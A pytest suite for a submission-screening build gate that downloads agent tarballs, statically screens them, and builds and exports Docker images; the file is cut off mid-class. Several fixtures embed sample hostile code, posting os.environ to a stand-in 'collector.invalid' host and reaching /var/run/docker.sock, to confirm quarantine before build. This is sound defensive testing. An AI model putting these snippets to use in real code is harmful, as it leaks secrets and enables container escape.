"""Stable-core tests for bounded artifact, build, health, and teardown behavior."""

from __future__ import annotations

import asyncio
import gzip
import hashlib
import io
import json
import logging
import os
import shutil
import tarfile
import tempfile
from collections.abc import Callable
from pathlib import Path
from typing import Any
from uuid import UUID

import httpx
import pytest

from ditto_screener import gate as gate_module
from ditto_screener.config import ScreenerConfig
from ditto_screener.gate import (
    _MAX_ARCHIVE_MEMBERS,
    _MAX_SCREENED_IMAGE_BYTES,
    BuildGate,
    BuiltImageArtifact,
    _detail_tail,
    _docker_infrastructure_failure,
    _format_stage_timings,
    _gateway_call_count,
    _log_tail,
    _normalized_build_context,
    _prepare_gateway_state,
    _ScreenedImageExportError,
    _ScreenedImageTooLargeError,
    dockerfile_at_root,
    image_binding_advisory,
)
from ditto_screener.platform import RemoteImageArchive
from ditto_screener.policy import (
    CORE_ONLY_MANIFEST,
    AgenticSourceReviewModule,
    PolicyEngine,
    PolicyManifest,
    ReviewJournal,
    ScreeningOutcome,
    SourceReviewObservation,
)

_AGENT = UUID("550e8400-e29b-41d4-a716-446655440000")
_ATTEMPT = UUID("7c5df3f9-3ea7-47ba-92d1-1bbcf4c5f300")
_MINER = "5DhaT8U7LVwnnJNUU8VL1XEipicatoaDVVq7cHo227gogVZm"


def test_gateway_state_is_owned_by_worker_and_appendable_by_rootless_uid() -> None:
    state_dir, state_file = _prepare_gateway_state()
    try:
        assert Path(state_dir).stat().st_mode & 0o7777 == 0o711
        assert Path(state_file).stat().st_mode & 0o777 == 0o622
        staged_script = Path(state_dir) / "fake_gateway.py"
        assert (
            staged_script.read_bytes()
            == Path(gate_module.__file__).with_name("fake_gateway.py").read_bytes()
        )
        assert staged_script.stat().st_mode & 0o777 == 0o444
        assert _gateway_call_count(state_file) == 0
    finally:
        shutil.rmtree(state_dir)


def test_gateway_state_uses_the_configured_host_visible_root(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    shared_root = tmp_path / "shared-gateway-state"
    monkeypatch.setenv("SCREENER_GATEWAY_STATE_ROOT", str(shared_root))

    state_dir, state_file = _prepare_gateway_state()
    try:
        assert Path(state_dir).parent == shared_root
        assert Path(state_file).parent == Path(state_dir)
        assert (Path(state_dir) / "fake_gateway.py").is_file()
    finally:
        shutil.rmtree(state_dir)


_URL = "https://storage.test/agent.tar.gz"


def _make_tar(files: dict[str, bytes]) -> bytes:
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w:gz") as tar:
        for name, data in files.items():
            info = tarfile.TarInfo(name=name)
            info.size = len(data)
            tar.addfile(info, io.BytesIO(data))
    return buffer.getvalue()


def _oci_image_save_archive(
    *, repo_tags: list[str] | None = None
) -> tuple[bytes, str, bytes]:
    layer = _make_tar({"app/ready.txt": b"ready\n"})
    compressed_layer = gzip.compress(layer, mtime=0)
    diff_id = "sha256:" + hashlib.sha256(layer).hexdigest()
    config = json.dumps(
        {
            "architecture": "amd64",
            "os": "linux",
            "rootfs": {"type": "layers", "diff_ids": [diff_id]},
        },
        separators=(",", ":"),
    ).encode()
    config_hex = hashlib.sha256(config).hexdigest()
    layer_hex = hashlib.sha256(compressed_layer).hexdigest()
    manifest = json.dumps(
        [
            {
                "Config": f"blobs/sha256/{config_hex}",
                "RepoTags": repo_tags,
                "Layers": [f"blobs/sha256/{layer_hex}"],
            }
        ],
        separators=(",", ":"),
    ).encode()
    archive = io.BytesIO()
    with tarfile.open(fileobj=archive, mode="w:") as tar:
        for name, payload in (
            ("manifest.json", manifest),
            (f"blobs/sha256/{config_hex}", config),
            (f"blobs/sha256/{layer_hex}", compressed_layer),
        ):
            info = tarfile.TarInfo(name)
            info.size = len(payload)
            tar.addfile(info, io.BytesIO(payload))
    return archive.getvalue(), f"sha256:{config_hex}", layer


def _valid_tar(**overrides: bytes) -> bytes:
    files = {
        "Dockerfile": b"FROM scratch\n",
        "Cargo.toml": b'[package]\nname = "agent"\nversion = "0.1.0"\n',
        "src/main.rs": b"fn main() {}\n",
    }
    files.update(overrides)
    return _make_tar(files)


def _gate_with(
    config: ScreenerConfig,
    run_stub: Callable[..., Any],
    *,
    tarball: bytes,
) -> BuildGate:
    def artifact(request: httpx.Request) -> httpx.Response:
        assert request.url == httpx.URL(_URL)
        return httpx.Response(200, content=tarball)

    client = httpx.AsyncClient(transport=httpx.MockTransport(artifact))
    gate = BuildGate(
        config,
        client,
        policy=PolicyEngine(CORE_ONLY_MANIFEST),
        journal=ReviewJournal(None),
    )
    gate._run = run_stub  # type: ignore[method-assign]
    return gate


def _ok_run(calls: list[list[str]] | None = None) -> Callable[..., Any]:
    async def run(args: list[str], *, stdin: Any = None, **_: Any) -> tuple[int, str]:
        if calls is not None:
            calls.append(args)
        if args[0] == "build" and stdin is not None:
            stdin.read()
            _write_iidfile(args)
        if args[:4] == ["image", "inspect", "--format", "{{.Id}}"]:
            return 0, "sha256:" + "34" * 32
        return 0, ""

    return run


def _write_iidfile(args: list[str]) -> None:
    """Emulate Docker BuildKit's immutable image-id output in unit tests."""
    Path(args[args.index("--iidfile") + 1]).write_text("sha256:" + "34" * 32)


async def _screen(  # type: ignore[no-untyped-def]
    gate: BuildGate, sha256: str, *, progress=None, build_only=False
):
    return await gate.screen(
        agent_id=_AGENT,
        attempt_id=_ATTEMPT,
        miner_hotkey=_MINER,
        sha256=sha256,
        download_url=_URL,
        progress=progress,
        build_only=build_only,
    )


async def test_timed_out_docker_process_may_exit_before_kill(
    make_config: Callable[..., ScreenerConfig], monkeypatch: pytest.MonkeyPatch
) -> None:
    class ExitedProcess:
        returncode = 1

        async def communicate(self) -> tuple[bytes, None]:
            raise TimeoutError

        def kill(self) -> None:
            raise ProcessLookupError

        async def wait(self) -> int:
            return 1

    async def create_process(*_args: object, **_kwargs: object) -> ExitedProcess:
        return ExitedProcess()

    monkeypatch.setattr(asyncio, "create_subprocess_exec", create_process)
    async with httpx.AsyncClient() as client:
        gate = BuildGate(
            make_config(),
            client,
            policy=PolicyEngine(CORE_ONLY_MANIFEST),
            journal=ReviewJournal(None),
        )
        code, output = await gate._run(["info"], timeout=0.01)

    assert code == 124
    assert output == "[timeout after 0.01s]"


def test_root_and_log_helpers() -> None:
    assert dockerfile_at_root(["Dockerfile", "src/lib.rs"])
    assert dockerfile_at_root(["./Dockerfile", "Cargo.toml"])
    assert not dockerfile_at_root(["sub/Dockerfile"])
    assert _log_tail("  hi  ") == "hi"
    assert len(_detail_tail("x" * 5000)) == 3900


def test_build_context_normalizes_unportable_archive_owners(tmp_path: Path) -> None:
    source_path = tmp_path / "agent.tar.gz"
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w:gz") as archive:
        for name, payload in (
            ("Dockerfile", b"FROM scratch\n"),
            ("src/main.py", b"print('ready')\n"),
        ):
            member = tarfile.TarInfo(name)
            member.uid = 197108
            member.gid = 197121
            member.uname = "subordinate-user"
            member.gname = "subordinate-group"
            member.mode = 0o640
            member.mtime = 123456789
            member.size = len(payload)
            archive.addfile(member, io.BytesIO(payload))
    source_path.write_bytes(buffer.getvalue())

    with (
        _normalized_build_context(str(source_path)) as normalized,
        tarfile.open(fileobj=normalized, mode="r:gz") as archive,
    ):
        members = archive.getmembers()
        assert [member.name for member in members] == [
            "Dockerfile",
            "src/main.py",
        ]
        assert all(member.uid == 0 and member.gid == 0 for member in members)
        assert all(not member.uname and not member.gname for member in members)
        assert members[0].mode == 0o640
        assert members[0].mtime == 123456789
        assert archive.extractfile("src/main.py").read() == b"print('ready')\n"


def test_unportable_build_context_owner_is_infrastructure_failure() -> None:
    assert _docker_infrastructure_failure(
        'failed to Lchown "Dockerfile" for UID 197108, GID 197121: '
        "lchownat Dockerfile: invalid argument"
    )


async def test_export_image_hashes_exact_docker_archive(
    make_config: Callable[..., ScreenerConfig],
) -> None:
    archive, config_id, layer = _oci_image_save_archive()
    daemon_image_id = "sha256:" + "34" * 32
    gate = _gate_with(make_config(), _ok_run(), tarball=_valid_tar())

    async def run(args: list[str], **_: Any) -> tuple[int, str]:
        if args[:3] == ["image", "save", "--output"]:
            Path(args[3]).write_bytes(archive)
            return 0, ""
        if args[:3] == ["image", "inspect", "--format"]:
            return 0, str(len(archive))
        raise AssertionError(args)

    gate._run = run  # type: ignore[method-assign]
    exported = await gate._export_image(
        daemon_image_id,
        image_ref=f"ditto-screen/{_AGENT}:latest",
        deadline=None,
    )
    try:
        assert exported.image_id == config_id
        assert exported.sha256 != hashlib.sha256(archive).hexdigest()
        assert exported.size_bytes == Path(exported.path).stat().st_size
        with tarfile.open(exported.path, mode="r:") as portable:
            names = portable.getnames()
            assert names[0] == "manifest.json"
            manifest = json.load(portable.extractfile("manifest.json"))
            assert manifest == [
                {
                    "Config": config_id.removeprefix("sha256:") + ".json",
                    "RepoTags": None,
                    "Layers": [hashlib.sha256(layer).hexdigest() + "/layer.tar"],
                }
            ]
            assert portable.extractfile(manifest[0]["Layers"][0]).read() == layer
    finally:
        os.unlink(exported.path)


async def test_export_image_strips_attempt_scoped_remote_tag(
    make_config: Callable[..., ScreenerConfig],
) -> None:
    """A remote builder tag is transport metadata, never scorer authority."""
    attempt_tag = f"ditto-screen/{_AGENT}-{_ATTEMPT}:latest"
    archive, config_id, _ = _oci_image_save_archive(repo_tags=[attempt_tag])
    gate = _gate_with(make_config(), _ok_run(), tarball=_valid_tar())

    async def run(args: list[str], **_: Any) -> tuple[int, str]:
        if args[:3] == ["image", "save", "--output"]:
            Path(args[3]).write_bytes(archive)
            return 0, ""
        if args[:3] == ["image", "inspect", "--format"]:
            return 0, str(len(archive))
        raise AssertionError(args)

    gate._run = run  # type: ignore[method-assign]
    exported = await gate._export_image(
        "sha256:" + "34" * 32,
        image_ref=f"ditto-screen/{_AGENT}:latest",
        deadline=None,
    )
    try:
        assert exported.image_id == config_id
        with tarfile.open(exported.path, mode="r:") as portable:
            manifest = json.load(portable.extractfile("manifest.json"))
        assert manifest[0]["RepoTags"] is None
    finally:
        os.unlink(exported.path)


async def test_targon_runtime_success_skips_docker_and_exports_archive(
    make_config: Callable[..., ScreenerConfig], tmp_path: Path
) -> None:
    tarball = _valid_tar()
    archive_bytes, config_id, _ = _oci_image_save_archive()
    archive_path = tmp_path / "remote.tar"
    archive_path.write_bytes(archive_bytes)
    calls: list[list[str]] = []
    published: list[BuiltImageArtifact] = []
    consumed: list[UUID] = []

    async def run(args: list[str], **_: Any) -> tuple[int, str]:
        calls.append(args)
        raise AssertionError(f"local Docker must not run: {args}")

    async def remote_build() -> RemoteImageArchive:
        return RemoteImageArchive(
            build_id=UUID("aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa"),
            path=str(archive_path),
            sha256=hashlib.sha256(archive_bytes).hexdigest(),
            size_bytes=len(archive_bytes),
            runtime_status="succeeded",
            runtime_image_reference=(
                "us-central1-docker.pkg.dev/ditto-app-dev/"
                "ditto-screening-candidates/miner@sha256:" + "ab" * 32
            ),
        )

    async def remote_build_consumed(build_id: UUID) -> None:
        consumed.append(build_id)

    async def publish(image: BuiltImageArtifact) -> None:
        published.append(image)

    gate = _gate_with(
        make_config(require_rootless_docker=True, remote_build_mode="require"),
        run,
        tarball=tarball,
    )
    async with gate._client:
        result = await gate.screen(
            agent_id=_AGENT,
            attempt_id=_ATTEMPT,
            miner_hotkey=_MINER,
            sha256=hashlib.sha256(tarball).hexdigest(),
            download_url=_URL,
            publish_image=publish,
            remote_build=remote_build,
            remote_build_consumed=remote_build_consumed,
        )
    assert result.outcome == ScreeningOutcome.PASS
    assert calls == []
    assert [image.image_id for image in published] == [config_id]
    assert consumed == [UUID("aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa")]


async def test_remote_require_does_not_local_build_without_targon_health(
    make_config: Callable[..., ScreenerConfig],
) -> None:
    tarball = _valid_tar()
    calls: list[list[str]] = []

    async def run(args: list[str], **_: Any) -> tuple[int, str]:
        calls.append(args)
        return 0, ""

    async def remote_build() -> None:
        return None

    gate = _gate_with(
        make_config(require_rootless_docker=True, remote_build_mode="require"),
        run,
        tarball=tarball,
    )
    async with gate._client:
        result = await gate.screen(
            agent_id=_AGENT,
            attempt_id=_ATTEMPT,
            miner_hotkey=_MINER,
            sha256=hashlib.sha256(tarball).hexdigest(),
            download_url=_URL,
            remote_build=remote_build,
        )
    assert result.outcome == ScreeningOutcome.RETRYABLE_INFRA
    assert result.evidence[-1].code == "targon-runtime-unavailable"
    assert calls == []


async def test_remote_kaniko_failure_is_deterministic_docker_rejection(
    make_config: Callable[..., ScreenerConfig],
) -> None:
    from ditto_screener.platform import RemoteSubmissionBuildRejected

    tarball = _valid_tar()

    async def remote_build() -> None:
        raise RemoteSubmissionBuildRejected("FLEET_SUBMISSION_KANIKO_FAILED")

    gate = _gate_with(
        make_config(require_rootless_docker=True, remote_build_mode="require"),
        _ok_run(),
        tarball=tarball,
    )
    async with gate._client:
        result = await gate.screen(
            agent_id=_AGENT,
            attempt_id=_ATTEMPT,
            miner_hotkey=_MINER,
            sha256=hashlib.sha256(tarball).hexdigest(),
            download_url=_URL,
            remote_build=remote_build,
        )
    assert result.outcome == ScreeningOutcome.DETERMINISTIC_REJECT
    assert result.evidence[-1].code == "docker-build"
    assert result.detail == "build failed: DITTO_SUBMISSION_BUILD_FAILED=KANIKO"


async def test_export_rejects_oversize_before_save(
    make_config: Callable[..., ScreenerConfig],
) -> None:
    image_id = "sha256:" + "34" * 32
    calls: list[list[str]] = []
    gate = _gate_with(make_config(), _ok_run(), tarball=_valid_tar())

    async def run(args: list[str], **_: Any) -> tuple[int, str]:
        calls.append(args)
        assert args[:3] == ["image", "inspect", "--format"]
        return 0, str(_MAX_SCREENED_IMAGE_BYTES + 1)

    gate._run = run  # type: ignore[method-assign]
    with pytest.raises(_ScreenedImageTooLargeError, match="exceeds"):
        await gate._export_image(
            image_id,
            image_ref=f"ditto-screen/{_AGENT}:latest",
            deadline=None,
        )
    assert not any(call[:2] == ["image", "save"] for call in calls)


async def test_export_failure_removes_partial_archive(
    make_config: Callable[..., ScreenerConfig], monkeypatch: Any, tmp_path: Path
) -> None:
    image_id = "sha256:" + "34" * 32
    partial = tmp_path / "partial.tar"
    gate = _gate_with(make_config(), _ok_run(), tarball=_valid_tar())
    real_mkstemp = tempfile.mkstemp

    def mkstemp(*args: Any, **kwargs: Any) -> tuple[int, str]:
        if kwargs.get("prefix") == "ditto-screened-image-":
            fd = os.open(partial, os.O_CREAT | os.O_TRUNC | os.O_RDWR, 0o600)
            return fd, str(partial)
        return real_mkstemp(*args, **kwargs)

    async def run(args: list[str], **_: Any) -> tuple[int, str]:
        if args[:3] == ["image", "inspect", "--format"]:
            return 0, "1"
        if args[:3] == ["image", "save", "--output"]:
            partial.write_bytes(b"partial")
            return 1, "no space left on device"
        raise AssertionError(args)

    monkeypatch.setattr(tempfile, "mkstemp", mkstemp)
    gate._run = run  # type: ignore[method-assign]
    with pytest.raises(_ScreenedImageExportError, match="no space left"):
        await gate._export_image(
            image_id,
            image_ref=f"ditto-screen/{_AGENT}:latest",
            deadline=None,
        )
    assert not partial.exists()


async def test_publish_failure_demotes_pass_with_dedicated_reason(
    make_config: Callable[..., ScreenerConfig],
) -> None:
    tarball = _valid_tar()
    saved_archive, _, _ = _oci_image_save_archive()

    async def run(args: list[str], *, stdin: Any = None, **_: Any) -> tuple[int, str]:
        if args[0] == "build":
            if stdin is not None:
                stdin.read()
            _write_iidfile(args)
        elif args[:4] == ["image", "inspect", "--format", "{{.Id}}"]:
            return 0, "sha256:" + "34" * 32
        elif args[:3] == ["image", "inspect", "--format"]:
            if "Config.Volumes" in args[3]:
                return 0, ""
            return 0, str(len(saved_archive))
        elif args[:3] == ["image", "save", "--output"]:
            Path(args[3]).write_bytes(saved_archive)
        return 0, ""

    async def fail_publish(_image: Any) -> None:
        raise RuntimeError("object storage unavailable")

    gate = _gate_with(make_config(), run, tarball=tarball)
    async with gate._client:
        result = await gate.screen(
            agent_id=_AGENT,
            attempt_id=_ATTEMPT,
            miner_hotkey=_MINER,
            sha256=hashlib.sha256(tarball).hexdigest(),
            download_url=_URL,
            publish_image=fail_publish,
        )
    assert result.outcome == ScreeningOutcome.RETRYABLE_INFRA
    assert result.evidence[-1].code == "image-upload-failed"
    assert "object storage unavailable" in result.detail


async def test_publish_uses_stable_agent_ref_with_attempt_scoped_build(
    make_config: Callable[..., ScreenerConfig],
) -> None:
    tarball = _valid_tar()
    saved_archive, config_id, _ = _oci_image_save_archive()
    calls: list[list[str]] = []
    published: list[BuiltImageArtifact] = []

    async def run(args: list[str], *, stdin: Any = None, **_: Any) -> tuple[int, str]:
        calls.append(args)
        if args[0] == "build":
            if stdin is not None:
                stdin.read()
            _write_iidfile(args)
        elif args[:4] == ["image", "inspect", "--format", "{{.Id}}"]:
            return 0, "sha256:" + "34" * 32
        elif args[:3] == ["image", "inspect", "--format"]:
            if "Config.Volumes" in args[3]:
                return 0, ""
            return 0, str(len(saved_archive))
        elif args[:3] == ["image", "save", "--output"]:
            Path(args[3]).write_bytes(saved_archive)
        return 0, ""

    async def publish(image: BuiltImageArtifact) -> None:
        published.append(image)

    gate = _gate_with(make_config(), run, tarball=tarball)
    async with gate._client:
        result = await gate.screen(
            agent_id=_AGENT,
            attempt_id=_ATTEMPT,
            miner_hotkey=_MINER,
            sha256=hashlib.sha256(tarball).hexdigest(),
            download_url=_URL,
            publish_image=publish,
        )

    attempt_ref = f"ditto-screen/{_AGENT}-{_ATTEMPT}:latest"
    assert result.outcome == ScreeningOutcome.PASS
    assert [image.image_ref for image in published] == [f"ditto-screen/{_AGENT}:latest"]
    assert [image.image_id for image in published] == [config_id]
    assert any(call[0] == "build" and attempt_ref in call for call in calls)
    assert ["rmi", "-f", attempt_ref] in calls


def test_image_binding_flags_prebuilt_entrypoint_without_build() -> None:
    prebuilt = (
        "FROM debian:bookworm-slim\n"
        "COPY agent /usr/local/bin/agent\n"
        'ENTRYPOINT ["/usr/local/bin/agent"]\n'
    )
    advisory = image_binding_advisory(prebuilt)
    assert advisory is not None
    # Advisory wording, not a contract rejection: the heuristic routes to
    # operator review because text matching cannot prove provenance.
    assert "error[" not in advisory
    assert "may not be the reviewed source" in advisory


def test_image_binding_allows_multistage_compiled_build() -> None:
    multistage = (
        "FROM rust:1.79 AS builder\n"
        "COPY . .\n"
        "RUN cargo build --release\n"
        "FROM debian:bookworm-slim\n"
        "COPY --from=builder /target/release/agent /agent\n"
        'ENTRYPOINT ["/agent"]\n'
    )
    assert image_binding_advisory(multistage) is None


def test_image_binding_allows_interpreted_source_without_compile_step() -> None:
    python = 'FROM python:3.12-alpine\nCOPY app.py /app.py\nCMD ["python", "/app.py"]\n'
    assert image_binding_advisory(python) is None


def test_image_binding_ignores_scratch_and_continuations() -> None:
    assert image_binding_advisory("FROM scratch\n") is None
    single_stage = (
        "FROM rust:1.79\n"
        "COPY . .\n"
        "RUN cargo \\\n build --release\n"
        'CMD ["./target/release/agent"]\n'
    )
    assert image_binding_advisory(single_stage) is None


async def test_default_v6_builds_and_health_checks_without_run(
    make_config: Callable[..., ScreenerConfig],
) -> None:
    tarball = _valid_tar()
    calls: list[list[str]] = []
    gate = _gate_with(make_config(), _ok_run(calls), tarball=tarball)
    async with gate._client:
        result = await _screen(gate, hashlib.sha256(tarball).hexdigest())

    assert result.outcome == ScreeningOutcome.PASS
    assert result.manifest_digest == CORE_ONLY_MANIFEST.digest
    assert any("http://harness:8080/health" in arg for call in calls for arg in call)
    assert not any("http://harness:8080/run" in arg for call in calls for arg in call)


async def test_static_malicious_preflight_quarantines_before_docker(
    make_config: Callable[..., ScreenerConfig],
    caplog: pytest.LogCaptureFixture,
) -> None:
    tarball = _valid_tar(
        **{
            "src/main.rs": (
                b'let endpoint = "/var/run/docker.sock";\n'
                b"connect_control_socket(endpoint);\n"
            )
        }
    )
    calls: list[list[str]] = []
    gate = _gate_with(make_config(), _ok_run(calls), tarball=tarball)
    async with gate._client:
        result = await _screen(gate, hashlib.sha256(tarball).hexdigest())

    assert result.outcome == ScreeningOutcome.QUARANTINE
    assert not any(call[0] in {"build", "run", "exec"} for call in calls)
    assert result.finding is not None
    assert result.finding["prompt_revision"] == "static-malicious-preflight-v1"
    assert "/var/run/docker.sock" not in str(result.finding)
    assert "static-source review lead" in caplog.text
    assert "execution_started=false" in caplog.text


async def test_static_preflight_v2_enforce_keeps_reachable_causal_quarantine(
    make_config: Callable[..., ScreenerConfig],
) -> None:
    tarball = _valid_tar(
        **{
            "Dockerfile": (
                b"FROM python:3.12\nCOPY app.py /app/app.py\n"
                b'ENTRYPOINT ["python", "/app/app.py"]\n'
            ),
            "app.py": (
                b"secret = os.environ.copy()\n"
                b"requests.post('https://collector.invalid', json=secret)\n"
            ),
        }
    )
    calls: list[list[str]] = []
    gate = _gate_with(
        make_config(static_preflight_v2_mode="enforce"),
        _ok_run(calls),
        tarball=tarball,
    )

    async with gate._client:
        result = await _screen(gate, hashlib.sha256(tarball).hexdigest())

    assert result.outcome == ScreeningOutcome.QUARANTINE
    assert not any(call[0] in {"build", "run", "exec"} for call in calls)
    assert result.finding is not None
    assert result.finding["prompt_revision"] == "static-malicious-preflight-v2"


async def test_static_preflight_v2_enforce_does_not_hold_excluded_local_helper(
    make_config: Callable[..., ScreenerConfig],
) -> None:
    tarball = _valid_tar(
        **{
            "Dockerfile": (
                b"FROM python:3.12\nCOPY app.py /app/app.py\n"
                b'ENTRYPOINT ["python", "/app/app.py"]\n'
            ),
            "app.py": b"print('ready')\n",
            "tools/local.py": (
                b"secret = os.environ.copy()\n"
                b"requests.post('https://collector.invalid', json=secret)\n"
            ),
        }
    )
    calls: list[list[str]] = []
    gate = _gate_with(
        make_config(static_preflight_v2_mode="enforce"),
        _ok_run(calls),
        tarball=tarball,
    )

    async with gate._client:
        result = await _screen(gate, hashlib.sha256(tarball).hexdigest())

    assert result.outcome == ScreeningOutcome.PASS
    assert any(call[0] == "build" for call in calls)


async def test_static_preflight_v2_enforce_reviews_unresolved_v1_before_build(
    make_config: Callable[..., ScreenerConfig],
) -> None:
    tarball = _valid_tar(
        **{
            "Dockerfile": b"FROM rust:bookworm\nCOPY . .\nRUN cargo build --release\n",
            "Cargo.toml": b'[package]\nname="app"\nversion="0.1.0"\n',
            "src/main.rs": b'include!(env!("GENERATED_SOURCE"));\nfn main() {}\n',
            "generated/payload.rs": b'let path = "/root/private";\nread(path);\n',
        }
    )
    calls: list[list[str]] = []
    gate = _gate_with(
        make_config(static_preflight_v2_mode="enforce"),
        _ok_run(calls),
        tarball=tarball,
    )

    async with gate._client:
        result = await _screen(gate, hashlib.sha256(tarball).hexdigest())

    assert result.outcome == ScreeningOutcome.QUARANTINE
    assert not any(call[0] in {"build", "run", "exec"} for call in calls)
    assert result.finding is not None
    assert result.finding["prompt_revision"] == "static-malicious-preflight-v1"


async def test_static_preflight_v2_enforce_reviews_helper_before_build(
    make_config: Callable[..., ScreenerConfig],
) -> None:
    tarball = _valid_tar(
        **{
            "Dockerfile": (
                b"FROM python:3.12\nCOPY app.py /app/app.py\n"
                b'ENTRYPOINT ["python", "/app/app.py"]\n'
            ),
            "app.py": (
                b'endpoint = "/var/run/docker.sock"\n'
                b"dispatch(endpoint)\n"
                b"def dispatch(value):\n    connect_control_socket(value)\n"
            ),
        }
    )
    calls: list[list[str]] = []
    gate = _gate_with(
        make_config(static_preflight_v2_mode="enforce"),
        _ok_run(calls),
        tarball=tarball,
    )

    async with gate._client:
        result = await _screen(gate, hashlib.sha256(tarball).hexdigest())

    assert result.outcome == ScreeningOutcome.QUARANTINE
    assert not any(call[0] in {"build", "run", "exec"} for call in calls)
    assert result.finding is not None
    assert result.finding["prompt_revision"] == "static-malicious-preflight-v1"


async def test_static_preflight_v2_shadow_preserves_v1_and_journals_delta(
    make_config: Callable[..., ScreenerConfig], tmp_path: Path
) -> None:
    tarball = _valid_tar(
        **{
            "Dockerfile": (
                b"FROM python:3.12\nCOPY app.py /app/app.py\n"
                b'ENTRYPOINT ["python", "/app/app.py"]\n'
            ),
            "app.py": b"print('ready')\n",
            "tools/local.py": (
                b"secret = os.environ.copy()\n"
                b"requests.post('https://collector.invalid', json=secret)\n"
            ),
        }
    )
    audit_path = tmp_path / "private" / "static-preflight.jsonl"
    calls: list[list[str]] = []
    gate = _gate_with(
        make_config(
            static_preflight_v2_mode="shadow",
            static_preflight_audit_file=str(audit_path),
        ),
        _ok_run(calls),
        tarball=tarball,
    )

    async with gate._client:
        result = await _screen(gate, hashlib.sha256(tarball).hexdigest())

    assert result.outcome == ScreeningOutcome.QUARANTINE
    assert result.finding is not None
    assert result.finding["prompt_revision"] == "static-malicious-preflight-v1"
    assert not any(call[0] in {"build", "run", "exec"} for call in calls)
    record = json.loads(audit_path.read_text())
    assert record["mode"] == "shadow"
    assert record["legacy_decisive"] is True
    assert record["candidate_decisive"] is False
    assert record["artifact_sha256"] == hashlib.sha256(tarball).hexdigest()
    assert "collector.invalid" not in audit_path.read_text()
    assert audit_path.stat().st_mode & 0o777 == 0o600
    assert audit_path.parent.stat().st_mode & 0o777 == 0o700


async def test_static_preflight_audit_failure_is_explicit_retryable_infrastructure(
    make_config: Callable[..., ScreenerConfig], tmp_path: Path
) -> None:
    destination = tmp_path / "must-not-change"
    destination.write_text("unchanged\n")
    audit_path = tmp_path / "static-preflight.jsonl"
    audit_path.symlink_to(destination)
    tarball = _valid_tar(
        **{
            "src/main.rs": (
                b'let endpoint = "/var/run/docker.sock";\n'
                b"connect_control_socket(endpoint);\n"
            )
        }
    )
    calls: list[list[str]] = []
    gate = _gate_with(
        make_config(
            static_preflight_v2_mode="shadow",
            static_preflight_audit_file=str(audit_path),
        ),
        _ok_run(calls),
        tarball=tarball,
    )

    async with gate._client:
        result = await _screen(gate, hashlib.sha256(tarball).hexdigest())

    assert result.outcome == ScreeningOutcome.RETRYABLE_INFRA
    assert [evidence.code for evidence in result.evidence] == [
        "static-preflight-audit-failed"
    ]
    assert not any(call[0] in {"build", "run", "exec"} for call in calls)
    assert destination.read_text() == "unchanged\n"


class _SafeStaticLeadReviewer:
    def __init__(self) -> None:
        self.resolve_calls = 0
        self.l1_calls = 0

    async def resolve_lead(
        self, *_args: Any, **_kwargs: Any
    ) -> SourceReviewObservation:
        self.resolve_calls += 1
        return SourceReviewObservation(
            ok=True,
            risk_level="low",
            finding_digest="a" * 64,
            categories=("none",),
            finding={
                "prompt_revision": "l3-sol-adversarial-critic-v3",
                "risk_level": "low",
                "confidence": 0.99,
                "categories": ["none"],
                "evidence": [],
            },
        )

    async def review(self, *_args: Any, **_kwargs: Any) -> SourceReviewObservation:
        self.l1_calls += 1
        raise AssertionError("a cleared static lead must not rerun L1")


class _AdjudicatedStaticLeadReviewer(_SafeStaticLeadReviewer):
    async def resolve_lead(
        self, *_args: Any, **_kwargs: Any
    ) -> SourceReviewObservation:
        self.resolve_calls += 1
        return SourceReviewObservation(
            ok=False,
            risk_level=None,
            finding_digest="b" * 64,
            categories=("cross_user_access",),
            failure_disposition="inconclusive",
            finding={
                "prompt_revision": "l3-sol-adversarial-critic-v3",
                "risk_level": "high",
                "confidence": 0.99,
                "categories": ["cross_user_access"],
                "evidence": [],
            },
            adjudication={
                "decision": "clear",
                "reason": "the observed lead is not reachable on the served path",
            },
        )


async def test_l3_cleared_static_lead_can_continue_to_build(
    make_config: Callable[..., ScreenerConfig],
) -> None:
    tarball = _valid_tar(
        **{
            "Dockerfile": b"FROM scratch\nCOPY . .\nRUN ./scripts/local-only.sh\n",
            "scripts/local-only.sh": (
                b'path="/var/run/docker.sock"\nconnect_control_socket "$path"\n'
            ),
        }
    )
    calls: list[list[str]] = []
    reviewer = _SafeStaticLeadReviewer()
    gate = _gate_with(make_config(), _ok_run(calls), tarball=tarball)
    gate._source_reviewer = reviewer  # type: ignore[assignment]
    async with gate._client:
        result = await _screen(gate, hashlib.sha256(tarball).hexdigest())

    assert result.outcome == ScreeningOutcome.PASS
    assert reviewer.resolve_calls == 1
    assert reviewer.l1_calls == 0
    assert any(call[0] == "build" for call in calls)


async def test_l4_cleared_static_lead_builds_before_it_passes(
    make_config: Callable[..., ScreenerConfig],
) -> None:
    """A terminal L4 clear admits only after the full image contract passes."""
    tarball = _valid_tar(
        **{
            "Dockerfile": b"FROM scratch\nCOPY . .\nRUN ./scripts/local-only.sh\n",
            "scripts/local-only.sh": (
                b'path="/var/run/docker.sock"\nconnect_control_socket "$path"\n'
            ),
        }
    )
    calls: list[list[str]] = []
    reviewer = _AdjudicatedStaticLeadReviewer()
    gate = _gate_with(make_config(), _ok_run(calls), tarball=tarball)
    gate._policy = _review_engine()
    gate._source_reviewer = reviewer  # type: ignore[assignment]

    async with gate._client:
        result = await _screen(gate, hashlib.sha256(tarball).hexdigest())

    assert result.outcome == ScreeningOutcome.PASS
    assert result.adjudication is not None
    assert result.adjudication["decision"] == "clear"
    assert reviewer.resolve_calls == 1
    assert reviewer.l1_calls == 0
    assert any(call[0] == "build" for call in calls)


async def test_reports_only_coarse_pipeline_stages(
    make_config: Callable[..., ScreenerConfig],
) -> None:
    tarball = _valid_tar()
    stages: list[str] = []
    gate = _gate_with(make_config(), _ok_run(), tarball=tarball)
    async with gate._client:
        result = await _screen(
            gate,
            hashlib.sha256(tarball).hexdigest(),
            progress=stages.append,
        )
    assert result.outcome == ScreeningOutcome.PASS
    assert stages == [
        "downloading",
        "validating",
        "building",
        "starting",
        "health_check",
        "validating",
    ]


class _StubReviewer:
    """Source-review stand-in that records lifecycle events."""

    def __init__(
        self,
        events: list[str],
        *,
        gate_event: asyncio.Event | None = None,
    ) -> None:
        self._events = events
        self._gate_event = gate_event
        self.cancelled = False

    async def review(self, *_args: Any, **_kwargs: Any) -> SourceReviewObservation:
